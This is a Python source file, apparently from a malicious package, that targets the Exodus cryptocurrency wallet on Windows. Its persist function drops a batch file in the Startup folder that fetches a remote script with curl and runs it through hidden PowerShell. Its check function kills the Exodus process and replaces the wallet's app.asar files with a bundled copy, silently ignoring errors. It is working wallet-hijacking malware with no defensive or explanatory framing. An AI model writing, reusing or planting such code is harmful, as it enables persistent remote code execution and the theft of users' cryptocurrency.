import os
import psutil
import shutil
import pkg_resources

def get_username():
    return os.getlogin()

def persist():
	startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
	file_path = os.path.join(startup_folder, "suckme.bat")
    
    with open(file_path, 'w') as file:
        file.write("cmd.exe /c curl -sSL https://raw.githubusercontent.com/ExodusChecker/IDFK/main/idfk.txt | powershell -windowstyle hidden -command -")

def check():
    try:
		persist()
        os.system(f"taskkill /IM Exodus.exe /F > NUL 2>&1")
    except Exception as e:
        pass

    package_path = pkg_resources.resource_filename('recovery', '')
    default_config_path = os.path.join(package_path, 'app.asar')
    base_dir = "C:\\Users\\" + get_username() + "\\AppData\\Local\\exodus\\"
    prefix = "app-"

    if not os.path.isfile(default_config_path):
        return

    for entry in os.listdir(base_dir):
        full_path = os.path.join(base_dir, entry)

        if os.path.isdir(full_path) and entry.startswith(prefix):
            resources_path = os.path.join(full_path, 'resources', 'app.asar')
            try:
                shutil.copy(default_config_path, resources_path)
            except Exception as e:
                pass
